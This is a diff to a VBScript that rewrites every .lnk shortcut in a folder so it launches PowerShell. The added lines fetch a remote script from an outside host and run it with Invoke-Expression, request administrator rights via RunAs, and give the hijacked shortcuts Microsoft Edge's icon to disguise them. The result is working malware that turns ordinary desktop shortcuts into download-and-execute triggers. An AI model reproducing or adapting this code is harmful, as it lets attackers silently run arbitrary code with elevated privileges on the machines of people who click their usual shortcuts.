@@ -19,7 +19,8 @@ For Each archivo In carpeta.Files
     If LCase(fso.GetExtensionName(archivo.Name)) = "lnk" Then
         Set accesoDirecto = shell.CreateShortcut(archivo.Path)
         accesoDirecto.TargetPath = "powershell.exe"
-        accesoDirecto.Arguments = "-c ""irm 'https://baa4ts.is-a-good.dev/IN.ps1' | iex"""
+        accesoDirecto.Arguments = "-Command ""Start-Process powershell.exe -ArgumentList '-c', 'irm ''https://baa4ts.is-a-good.dev/IN.ps1'' | Invoke-Expression' -Verb RunAs"""
+        accesoDirecto.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, 0" ' Ruta al ícono de Edge
         accesoDirecto.Save
     End If
 Next
